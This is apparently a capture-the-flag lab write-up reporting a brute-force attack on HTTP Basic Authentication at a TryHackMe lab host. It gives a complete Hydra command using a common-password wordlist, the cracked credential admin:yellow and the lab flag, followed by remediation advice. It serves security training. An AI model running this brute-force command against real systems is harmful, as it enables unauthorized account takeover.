# HTTP Basic Authentication - enum.thm/basic_auth

**Severity:** Medium 
**Target:** http://enum.thm/labs/basic_auth/

## Summary
The absence of rate limiting and a weak password allow an attacker to perform a brute force attack without being blocked.

## Vulnerability Details
**Type:** HTTP Basic Authentication
**Root Cause:** Absence of rate limiting and weak password + protocol that does not have native lockout.
**Endpoint:** http://enum.thm/labs/basic_auth/

## Steps to Reproduce
1. Use burp in the target to find the real path ``/labs/basic_auth/``
2. Use the wordlist in the task located at /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt
3. Run the following Hydra command against the target

## Proof of Concept
```bash
hydra -l admin \
-P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt \
enum.thm \
http-get \
"/labs/basic_auth/"
```

it returned admin:yellow
The THM flag ``THM{b4$$1C_AuTTHHH}``

## Results
<br>
<img width="1919" height="1016" alt="image" src="https://github.com/user-attachments/assets/a2ed4f39-ebf6-467b-966a-7b8bdd66ce1e" />


## Impact
This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
developer should put a rate limit by IP and enforce strong password policy. this should keep safe by most of the attacks. or change the authentication method
